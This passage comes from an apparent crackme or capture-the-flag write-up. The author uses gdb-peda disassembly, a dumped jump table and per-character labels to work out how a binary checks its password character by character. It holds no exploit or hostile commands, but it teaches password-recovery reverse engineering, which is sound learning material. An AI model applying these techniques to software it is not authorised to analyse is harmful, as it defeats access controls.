</span><span class='line'>   0x80485c4: sar    edi,0x1f                 <span class="c"># no idea what this </span>
</span><span class='line'>   0x80485c7: shr    edi,0x19                 <span class="c"># is supposed to do.</span>
</span><span class='line'>   0x80485ca: add    ecx,edi
</span><span class='line'>   0x80485cc: and    ecx,0x7f                 <span class="c"># check for ASCII?</span>
</span><span class='line'>   0x80485cf: sub    ecx,edi
</span><span class='line'>   0x80485d1: mov    BYTE PTR <span class="o">[</span>esp+ecx*1+0xc<span class="o">]</span>,0x1
</span><span class='line'>   0x80485d6: lea    ecx,<span class="o">[</span>ebp-0xa<span class="o">]</span>            <span class="c"># subtract 0xa from char</span>
</span><span class='line'>   0x80485d9: cmp    cl,0x70                  <span class="c"># check for below &#39;z&#39;</span>
</span><span class='line'>   0x80485dc: jbe    0x8048600
</span></code></pre></td></tr></table></div></figure>


<p>And then jumps to <code>0x8048600</code>. This piece is interesting, because it uses a jump-table (like in a switch statement). Depending on the value of (char - 0xa), it jumps to a code region:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x8048600:  movzx  ecx,cl
</span><span class='line'>   0x8048603: jmp    DWORD PTR <span class="o">[</span>ecx*4+0x8048b90<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/400x 0x8048b90
</span><span class='line'>0x8048b90:    0x08048610  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ba0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bb0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bc0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bd0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048be0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bf0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c00:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c10:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c20:    0x080485de  0x080485de  0x08048628  0x08048640
</span><span class='line'>0x8048c30:    0x08048658  0x08048678  0x08048698  0x080486c0
</span><span class='line'>0x8048c40:    0x080486e0  0x08048708  0x08048730  0x08048758
</span><span class='line'>0x8048c50:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c60:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c70:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c80:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c90:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ca0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cb0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cc0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cd0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ce0:    0x080485de  0x080485de  0x080485de  0x08048780
</span><span class='line'>0x8048cf0:    0x080487a0  0x080487c0  0x080487e0  0x08048800
</span><span class='line'>0x8048d00:    0x08048820  0x08048840  0x08048858  0x08048878
</span><span class='line'>0x8048d10:    0x08048898  0x080488b8  0x080488d0  0x080488f0
</span><span class='line'>0x8048d20:    0x08048910  0x08048928  0x08048950  0x08048970
</span><span class='line'>0x8048d30:    0x08048990  0x080489b0  0x080489d0  0x080489e8
</span><span class='line'>0x8048d40:    0x08048a08  0x08048a28  0x08048a48  0x08048a68
</span><span class='line'>0x8048d50:    0x08048a88  0x73736150  0x64726f77  0x4300203a
</span></code></pre></td></tr></table></div></figure>


<p>There are a lot of occurences of <code>0x080485de</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x80485de:    xor    eax,eax
</span><span class='line'>   0x80485e0: mov    edx,DWORD PTR <span class="o">[</span>esp+0x8c<span class="o">]</span>
</span><span class='line'>   0x80485e7: xor    edx,DWORD PTR gs:0x14
</span><span class='line'>   0x80485ee: jne    0x8048ab0
</span><span class='line'>   0x80485f4: add    esp,0x9c
</span><span class='line'>   0x80485fa: pop    ebx
</span><span class='line'>   0x80485fb: pop    esi
</span><span class='line'>   0x80485fc: pop    edi
</span><span class='line'>   0x80485fd: pop    ebp
</span><span class='line'>   0x80485fe: ret
</span></code></pre></td></tr></table></div></figure>


<p>Which basically means &ldquo;get out of here, your password isn&rsquo;t correct&rdquo;. I decided to continue and see what the code did:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x8048603:  jmp    DWORD PTR <span class="o">[</span>ecx*4+0x8048b90<span class="o">]</span>
</span><span class='line'> <span class="p">|</span> 0x804860a:  lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'> <span class="p">|</span> 0x8048610:  cmp    edx,0xd
</span><span class='line'> <span class="p">|</span> 0x8048613:  sete   dl
</span><span class='line'> <span class="p">|</span> 0x8048616:  xor    eax,eax
</span><span class='line'> <span class="p">|</span>-&gt;   0x8048628:   <span class="nb">test   </span>edx,edx
</span><span class='line'>       0x804862a: jne    0x80485de
</span><span class='line'>       0x804862c: cmp    BYTE PTR <span class="o">[</span>esp+0x7c<span class="o">]</span>,0x0
</span><span class='line'>       0x8048631: je     0x80485de
</span><span class='line'>       0x8048633: mov    edx,0x1
</span><span class='line'>       0x8048638: jmp    0x80485ab
</span></code></pre></td></tr></table></div></figure>


<p>It checks if <code>edx</code> is zero. If it is, it checks if some memory location is zero (it was) and then sets edx to 1. It then goes back to the code where a byte is taken from the password. Only this time, it would be the second byte! This means that I accidentally guessed the first char of the password right. The next one was not correct, as I supplied <code>1</code> which then jumps to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x8048640:    cmp    edx,0xe
</span><span class='line'>   0x8048643: jne    0x80485de
</span><span class='line'>   0x8048645: cmp    BYTE PTR <span class="o">[</span>esp+0x7d<span class="o">]</span>,0x0
</span><span class='line'>   0x804864a: je     0x80485de
</span><span class='line'>   0x804864c: mov    edx,0xf
</span><span class='line'>   0x8048651: jmp    0x80485ab
</span><span class='line'>   0x8048656: xchg   ax,ax
</span></code></pre></td></tr></table></div></figure>


<p>Because <code>edx</code> was not set to <code>0xe</code>, the check fails and the password is incorrect. From here on, I dumped the jumptable and gave each memory location a label using a python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x08048610:
</span><span class='line'>...snip...
</span><span class='line'>0x080485de:!
</span><span class='line'>0x080485de:<span class="err">&quot;</span>
</span><span class='line'>0x080485de:#
</span><span class='line'>0x080485de:<span class="err">$</span>
</span><span class='line'>0x080485de:%
</span><span class='line'>0x080485de:<span class="p">&amp;</span>
</span><span class='line'>0x080485de:<span class="err">&#39;</span>
</span><span class='line'>0x080485de:<span class="o">(</span>
</span><span class='line'>0x080485de:<span class="o">)</span>
</span><span class='line'>0x080485de:*
</span><span class='line'>0x080485de:+
</span><span class='line'>0x080485de:,
</span><span class='line'>0x080485de:-
</span><span class='line'>0x080485de:.
</span><span class='line'>0x080485de:/
</span><span class='line'>0x08048628:0
</span><span class='line'>0x08048640:1
</span><span class='line'>0x08048658:2
</span><span class='line'>0x08048678:3
</span><span class='line'>0x08048698:4
</span><span class='line'>0x080486c0:5
</span><span class='line'>0x080486e0:6
</span><span class='line'>0x08048708:7
</span><span class='line'>0x08048730:8
</span><span class='line'>0x08048758:9
</span><span class='line'>0x080485de::
</span><span class='line'>0x080485de:<span class="p">;</span>
</span><span class='line'>0x080485de:&lt;
</span><span class='line'>0x080485de:<span class="o">=</span>
</span><span class='line'>0x080485de:&gt;
</span><span class='line'>0x080485de:?
</span><span class='line'>0x080485de:@
</span><span class='line'>0x080485de:A
</span><span class='line'>0x080485de:B
</span><span class='line'>0x080485de:C
</span><span class='line'>0x080485de:D
</span><span class='line'>0x080485de:E
</span><span class='line'>0x080485de:F
</span><span class='line'>0x080485de:G
</span><span class='line'>0x080485de:H
</span><span class='line'>0x080485de:I
</span><span class='line'>0x080485de:J
</span><span class='line'>0x080485de:K
</span><span class='line'>0x080485de:L
</span><span class='line'>0x080485de:M
</span><span class='line'>0x080485de:N
</span><span class='line'>0x080485de:O
</span><span class='line'>0x080485de:P
</span><span class='line'>0x080485de:Q
</span><span class='line'>0x080485de:R
</span><span class='line'>0x080485de:S
</span><span class='line'>0x080485de:T
</span><span class='line'>0x080485de:U
</span><span class='line'>0x080485de:V
</span><span class='line'>0x080485de:W
</span><span class='line'>0x080485de:X
</span><span class='line'>0x080485de:Y
</span><span class='line'>0x080485de:Z
</span><span class='line'>0x080485de:<span class="o">[</span>
</span><span class='line'>0x080485de:<span class="se">\</span>
</span><span class='line'>0x080485de:<span class="o">]</span>
</span><span class='line'>0x080485de:^
</span><span class='line'>0x080485de:_
</span><span class='line'>0x080485de:<span class="sb">`</span>
</span><span class='line'>0x08048780:a
</span><span class='line'>0x080487a0:b
</span><span class='line'>0x080487c0:c
</span><span class='line'>0x080487e0:d
</span><span class='line'>0x08048800:e
</span><span class='line'>0x08048820:f
</span><span class='line'>0x08048840:g
</span><span class='line'>0x08048858:h
</span><span class='line'>0x08048878:i
</span><span class='line'>0x08048898:j
</span><span class='line'>0x080488b8:k
</span><span class='line'>0x080488d0:l
</span><span class='line'>0x080488f0:m
</span><span class='line'>0x08048910:n
</span><span class='line'>0x08048928:o
</span><span class='line'>0x08048950:p
</span><span class='line'>0x08048970:q
</span><span class='line'>0x08048990:r
</span><span class='line'>0x080489b0:s
</span><span class='line'>0x080489d0:t
</span><span class='line'>0x080489e8:u
</span><span class='line'>0x08048a08:v
</span><span class='line'>0x08048a28:w
</span><span class='line'>0x08048a48:x
</span><span class='line'>0x08048a68:y
</span><span class='line'>0x08048a88:z
</span></code></pre></td></tr></table></div></figure>


<p>Then I dumped all the instructions starting at <code>0x8048610</code> and labelled them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x0a
</span><span class='line'>   0x8048610: cmp    edx,0xd  
</span><span class='line'>   0x8048613: sete   dl
</span><span class='line'>   0x8048616: xor    eax,eax
</span><span class='line'>   0x8048618: cmp    BYTE PTR <span class="o">[</span>esp+0x56<span class="o">]</span>,0x0
</span><span class='line'>   0x804861d: setne  al
</span><span class='line'>   0x8048620: and    eax,edx
</span><span class='line'>   0x8048622: jmp    0x80485e0
</span><span class='line'>   0x8048624: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048628:0
</span><span class='line'>   0x8048628: <span class="nb">test   </span>edx,edx
</span><span class='line'>   0x804862a: jne    0x80485de
</span><span class='line'>   0x804862c: cmp    BYTE PTR <span class="o">[</span>esp+0x7c<span class="o">]</span>,0x0
</span><span class='line'>   0x8048631: je     0x80485de
</span><span class='line'>   0x8048633: mov    edx,0x1
</span><span class='line'>   0x8048638: jmp    0x80485ab
</span><span class='line'>   0x804863d: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048640:1
</span><span class='line'>   0x8048640: cmp    edx,0xe
</span><span class='line'>   0x8048643: jne    0x80485de
</span><span class='line'>   0x8048645: cmp    BYTE PTR <span class="o">[</span>esp+0x7d<span class="o">]</span>,0x0
</span><span class='line'>   0x804864a: je     0x80485de
</span><span class='line'>   0x804864c: mov    edx,0xf
</span><span class='line'>   0x8048651: jmp    0x80485ab
</span><span class='line'>   0x8048656: xchg   ax,ax
</span><span class='line'>   // 0x08048658:2
</span><span class='line'>   0x8048658: cmp    edx,0x14
</span><span class='line'>   0x804865b: jne    0x80485de
</span><span class='line'>   0x804865d: cmp    BYTE PTR <span class="o">[</span>esp+0x7e<span class="o">]</span>,0x0
</span><span class='line'>   0x8048662: je     0x80485de
</span><span class='line'>   0x8048668: mov    edx,0x15
</span><span class='line'>   0x804866d: jmp    0x80485ab
</span><span class='line'>   0x8048672: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048678:3
</span><span class='line'>   0x8048678: cmp    edx,0x59
</span><span class='line'>   0x804867b: jne    0x80485de
</span><span class='line'>   0x8048681: cmp    BYTE PTR <span class="o">[</span>esp+0x7f<span class="o">]</span>,0x0
</span><span class='line'>   0x8048686: je     0x80485de
</span><span class='line'>   0x804868c: mov    edx,0x5a
</span><span class='line'>   0x8048691: jmp    0x80485ab
</span><span class='line'>   0x8048696: xchg   ax,ax
</span><span class='line'>   // 0x08048698:4
</span><span class='line'>   0x8048698: cmp    edx,0xf
</span><span class='line'>   0x804869b: jne    0x80485de
</span><span class='line'>   0x80486a1: cmp    BYTE PTR <span class="o">[</span>esp+0x80<span class="o">]</span>,0x0
</span><span class='line'>   0x80486a9: je     0x80485de
</span><span class='line'>   0x80486af: mov    edx,0x10
</span><span class='line'>   0x80486b4: jmp    0x80485ab
</span><span class='line'>   0x80486b9: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080486c0:5
</span><span class='line'>   0x80486c0: cmp    edx,0xe
</span><span class='line'>   0x80486c3: jne    0x80485de
</span><span class='line'>   0x80486c9: cmp    BYTE PTR <span class="o">[</span>esp+0x81<span class="o">]</span>,0x0
</span><span class='line'>   0x80486d1: jne    0x804864c
</span><span class='line'>   0x80486d7: jmp    0x80485de
</span><span class='line'>   0x80486dc: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080486e0:6
</span><span class='line'>   0x80486e0: cmp    edx,0xc
</span><span class='line'>   0x80486e3: jne    0x80485de
</span><span class='line'>   0x80486e9: cmp    BYTE PTR <span class="o">[</span>esp+0x82<span class="o">]</span>,0x0
</span><span class='line'>   0x80486f1: je     0x80485de
</span><span class='line'>   0x80486f7: mov    edx,0xd
</span><span class='line'>   0x80486fc: jmp    0x80485ab
</span><span class='line'>   0x8048701: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048708:7
</span><span class='line'>   0x8048708: cmp    edx,0x5
</span><span class='line'>   0x804870b: jne    0x80485de
</span><span class='line'>   0x8048711: cmp    BYTE PTR <span class="o">[</span>esp+0x83<span class="o">]</span>,0x0
</span><span class='line'>   0x8048719: je     0x80485de
</span><span class='line'>   0x804871f: mov    edx,0x6
</span><span class='line'>   0x8048724: jmp    0x80485ab
</span><span class='line'>   0x8048729: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // ?? 0x08048730:8
</span><span class='line'>   0x8048730: xor    eax,eax
</span><span class='line'>   0x8048732: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x804873a: je     0x80485e0
</span><span class='line'>   0x8048740: cmp    edx,0x2
</span><span class='line'>   0x8048743: sete   al
</span><span class='line'>   0x8048746: cmp    edx,0x21
</span><span class='line'>   0x8048749: sete   dl
</span><span class='line'>   0x804874c: or     eax,edx
</span><span class='line'>   0x804874e: movzx  eax,al
</span><span class='line'>   0x8048751: jmp    0x80485e0
</span><span class='line'>   0x8048756: xchg   ax,ax
</span><span class='line'>   // 0x08048758:9
</span><span class='line'>   0x8048758: cmp    edx,0x1
</span><span class='line'>   0x804875b: jne    0x80485de
</span><span class='line'>   0x8048761: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x8048769: je     0x80485de
</span><span class='line'>   0x804876f: mov    edx,0x2
</span><span class='line'>   0x8048774: jmp    0x80485ab
</span><span class='line'>   0x8048779: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048780:a
</span><span class='line'>   0x8048780: cmp    edx,0x23
</span><span class='line'>   0x8048783: jne    0x80485de
</span><span class='line'>   0x8048789: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x804878e: je     0x80485de
</span><span class='line'>   0x8048794: mov    edx,0x24
</span><span class='line'>   0x8048799: jmp    0x80485ab
</span><span class='line'>   0x804879e: xchg   ax,ax
